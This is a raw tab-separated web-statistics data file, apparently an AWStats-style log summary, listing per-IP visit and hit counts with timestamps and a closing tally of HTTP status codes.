5	1	1	0	0	25084168	0	0	25084168	0	0	7751	138.197.95.166
5	1	1	0	0	25710302	0	0	25710302	0	0	6782	151.80.39.112
5	3	3	0	0	25738570	0	0	25707535	0	0	22204	151.80.39.111
5	1	1	0	0	25084170	0	0	25084170	0	0	7751	138.197.114.244
5	0	0	0	1	0	0	25084180	0	0	25084180	0	104.131.173.96
5	14	14	0	0	25429068	0	0	25337969	0	0	108514	54.183.165.74
5	1	0	0	3	25342061	0	25342061	25342061	0	25342061	0	13.85.80.193
5	1	1	0	0	25707158	0	0	25707158	0	0	8034	151.80.39.102
5	1	1	0	0	25712349	0	0	25712349	0	0	6782	151.80.39.101
5	1	1	0	0	25713180	0	0	25713180	0	0	7221	5.196.87.62
5	1	1	0	0	25989661	0	0	25989661	0	0	7711	34.217.98.106
5	1	1	0	0	24994410	0	0	24994410	0	0	7751	45.55.84.129
5	1	1	0	0	25706210	0	0	25706210	0	0	7711	5.196.87.52
5	1	1	0	0	25966368	0	0	25966368	0	0	0	54.183.213.239
5	1	1	0	0	25864553	0	0	25864553	0	0	7711	159.203.161.67
5	1	1	0	0	26035729	0	0	26035729	0	0	7711	34.212.134.5
5	1	1	0	0	25716858	0	0	25716858	0	0	7711	5.196.87.47
5	1	1	0	0	25705747	0	0	25705747	0	0	7711	5.196.87.44
5	1	1	0	0	25998227	0	0	25998227	0	0	39909	68.183.150.3
5	1	1	0	0	25857155	0	0	25857155	0	0	7711	34.211.85.210
5	1	1	0	0	25711146	0	0	25711146	0	0	7221	5.196.87.43
5	1	1	0	0	25998133	0	0	25998133	0	0	39897	138.197.103.72
5	0	0	0	2	0	0	25736447	0	0	25697076	0	5.196.87.41
5	0	0	0	4	0	0	25716424	0	0	25703135	0	5.196.87.40
5	1	1	0	0	25999738	0	0	25999738	0	0	7711	54.186.242.182
5	1	1	0	0	25716424	0	0	25716424	0	0	7221	5.196.87.33
5	0	0	0	1	0	0	26038701	0	0	26038701	0	167.71.186.201
5	1	1	0	0	24876396	0	0	24876396	0	0	7751	138.197.13.57
5	1	1	0	0	25996770	0	0	25996770	0	0	7711	52.27.202.108
5	2	1	0	0	25716618	0	0	25708265	0	0	14937	5.196.87.25
5	1	1	0	0	25710348	0	0	25710348	0	0	7711	5.196.87.23
5	1	1	0	0	25854289	0	0	25854289	0	0	7711	34.222.99.214
5	0	0	0	1	0	0	25389021	0	0	25389021	0	104.236.46.230
5	1	1	0	0	25708452	0	0	25708452	0	0	7711	5.196.87.11
5	1	1	0	0	26080483	0	0	26080483	0	0	7711	54.184.105.225
5	1	1	0	0	25983751	0	0	25983751	0	0	7711	54.218.62.192
5	1	1	0	0	25826786	0	0	25826786	0	0	7711	34.215.15.37
5	0	0	0	1	0	0	24994406	0	0	24994406	0	159.203.101.115
5	1	1	0	0	26001266	0	0	26001266	0	0	7711	54.212.205.201
5	0	0	0	1	0	0	25389028	0	0	25389028	0	104.131.167.238
5	1	1	0	0	26021153	0	0	26021153	0	0	7711	34.212.61.251
5	1	1	0	0	25954098	0	0	25954098	0	0	7711	142.93.70.8
5	0	0	0	1	0	0	25540351	0	0	25540351	0	191.119.23.177
5	0	0	0	1	0	0	24931824	0	0	24931824	0	174.138.53.82
5	0	0	0	1	0	0	25567941	0	0	25567941	0	142.93.68.157
5	0	0	0	1	0	0	24913740	0	0	24913740	0	104.131.102.252
5	1	1	0	0	25299600	0	0	25299600	0	0	7751	159.65.40.176
5	0	0	0	1	0	0	25500039	0	0	25500039	0	191.116.94.40
5	0	0	0	1	0	0	25344728	0	0	25344728	0	165.227.99.221
5	0	0	0	2	0	0	25582234	0	0	25582158	0	191.119.249.31
5	0	0	0	1	0	0	25695001	0	0	25695001	0	104.248.7.127
5	1	1	0	0	25488630	0	0	25488630	0	0	7751	13.56.250.235
5	12	12	0	0	25477631	0	0	25429849	0	0	93012	54.215.254.26
5	1	1	0	0	25763499	0	0	25763499	0	0	7711	34.221.236.175
5	0	0	0	1	0	0	25596804	0	0	25596804	0	191.116.59.88
5	0	0	0	2	0	0	25740194	0	0	25740194	0	216.218.222.12
5	1	0	0	3	26027201	0	26027201	26027201	0	26027201	0	52.125.128.2
5	1	1	0	0	25936383	0	0	25936383	0	0	7711	54.213.41.195
5	1	0	0	3	26015698	0	26015698	26015698	0	26015698	0	52.125.128.1
5	1	1	0	0	25795384	0	0	25795384	0	0	7711	54.191.2.66
5	1	1	0	0	25897590	0	0	25897590	0	0	0	13.52.74.128
5	1	1	0	0	25979736	0	0	25979736	0	0	0	34.228.19.228
5	1	1	0	0	25778058	0	0	25778058	0	0	7711	54.188.65.3
5	1	1	0	0	25757733	0	0	25757733	0	0	7711	34.209.112.254
5	0	0	0	1	0	0	25473790	0	0	25473790	0	104.236.122.19
5	0	0	0	1	0	0	25652195	0	0	25652195	0	159.65.254.127
5	0	0	0	2	0	0	25805604	0	0	25805580	0	191.119.186.235
5	1	1	0	0	26015502	0	0	26015502	0	0	7711	54.214.133.70
5	1	1	0	0	25898927	0	0	25898927	0	0	7711	34.212.178.169
5	1	1	0	0	25785189	0	0	25785189	0	0	7711	34.210.114.81
5	1	1	0	0	25609189	0	0	25609189	0	0	7711	45.55.56.163
5	1	1	0	0	25959363	0	0	25959363	0	0	7711	34.216.54.31
5	1	1	0	0	25890801	0	0	25890801	0	0	7711	34.222.23.172
5	1	1	0	0	25811020	0	0	25811020	0	0	7711	18.236.151.74
5	1	1	0	0	25387966	0	0	25387966	0	0	7751	104.131.61.63
5	1	1	0	0	26074754	0	0	26074754	0	0	7711	52.10.204.174
5	1	1	0	0	24931801	0	0	24931801	0	0	7751	138.197.4.107
5	1	1	0	0	25954146	0	0	25954146	0	0	7711	138.197.4.100
5	1	1	0	0	26016965	0	0	26016965	0	0	7711	54.212.43.197
5	0	0	0	1	0	0	25525240	0	0	25525240	0	185.100.87.206
5	1	1	0	0	26043222	0	0	26043222	0	0	7711	52.27.223.238
5	0	0	0	2	0	0	25534652	0	0	25534561	0	191.119.72.140
5	1	1	0	0	25969457	0	0	25969457	0	0	7711	35.162.242.71
5	2	2	0	1	25960423	0	26068304	25899762	0	26068304	15422	209.17.97.122
5	1	1	0	0	24933074	0	0	24933074	0	0	7751	104.236.29.173
5	1	1	0	0	25769301	0	0	25769301	0	0	7711	34.216.169.122
5	3	3	0	0	26068172	0	0	25880153	0	0	23133	209.17.97.114
5	0	0	0	2	0	0	25550512	0	0	25550402	0	191.119.3.49
5	0	0	0	1	0	0	25299573	0	0	25299573	0	159.89.190.129
5	4	4	0	1	26047510	0	25818092	25863199	0	25818092	30844	209.17.97.106
5	0	0	0	4	0	0	25595558	0	0	25595045	0	191.116.157.184
5	1	1	0	0	26047314	0	0	26047314	0	0	7711	34.210.16.104
5	1	1	0	0	25344741	0	0	25344741	0	0	7751	159.65.162.210
5	0	0	0	1	0	0	25043157	0	0	25043157	0	174.138.71.117
5	1	1	0	0	24933014	0	0	24933014	0	0	7751	45.55.237.45
5	1	1	0	0	25821137	0	0	25821137	0	0	7711	18.236.230.217
5	3	3	0	0	25953735	0	0	25949853	0	0	23133	52.11.99.15
5	1	1	0	0	25834298	0	0	25834298	0	0	7711	54.218.94.214
5	2	2	0	0	25923367	0	0	25923367	0	0	15422	34.221.19.200
5	1	1	0	0	25816881	0	0	25816881	0	0	7711	34.217.54.158
5	1	1	0	0	26028477	0	0	26028477	0	0	7711	34.216.131.96
5	2	2	0	0	25790890	0	0	25790890	0	0	15422	35.164.198.177
5	1	1	0	0	25909279	0	0	25909279	0	0	7711	34.215.119.81
5	1	1	0	0	26044287	0	0	26044287	0	0	7711	34.222.72.162
5	0	0	0	1	0	0	25609234	0	0	25609234	0	174.138.54.212
5	0	0	0	3	0	0	24859838	0	0	24859832	0	66.249.65.196
5	1	1	0	0	25999686	0	0	25999686	0	0	7711	54.185.100.76
5	1	1	0	0	25920425	0	0	25920425	0	0	7711	34.208.199.17
5	0	0	0	1	0	0	25043159	0	0	25043159	0	104.236.118.43
5	0	0	0	1	0	0	25863811	0	0	25863811	0	134.209.46.174
5	2	2	0	0	26008252	0	0	26007162	0	0	47620	62.4.14.206
5	0	0	0	1	0	0	24859832	0	0	24859832	0	66.249.65.200
5	0	0	0	1	0	0	25461342	0	0	25461342	0	191.116.30.143
5	0	0	0	1	0	0	26087132	0	0	26087132	0	66.249.65.184
5	0	0	0	1	0	0	26087132	0	0	26087132	0	66.249.65.180
5	0	0	0	1	0	0	25472694	0	0	25472694	0	191.116.90.144
5	1	1	0	0	25851409	0	0	25851409	0	0	7711	34.219.77.13
5	0	0	0	1	0	0	25473920	0	0	25473920	0	104.236.225.82
5	1	1	0	0	25179014	0	0	25179014	0	0	7751	174.138.54.162
5	1	1	0	0	25978110	0	0	25978110	0	0	7711	54.189.178.15
5	1	1	0	0	26037217	0	0	26037217	0	0	7711	34.221.138.172
5	1	1	0	0	25130231	0	0	25130231	0	0	7751	104.236.73.185
5	0	0	0	1	0	0	25092807	0	0	25092807	0	66.249.64.74
5	0	0	0	42	0	0	25718356	0	0	25085103	0	66.249.64.72
z	0	212	189	26027201	0
z	2	2	0	25926420	78
z	3	5	0	26072979	1255
z	4	987	935	26090399	7504553
z	5	66	27	26085787	2171799
c	200	1272	26090399
c	302	4	24910350
c	400	23	25968510
c	401	387	26085765
c	404	978	26087132
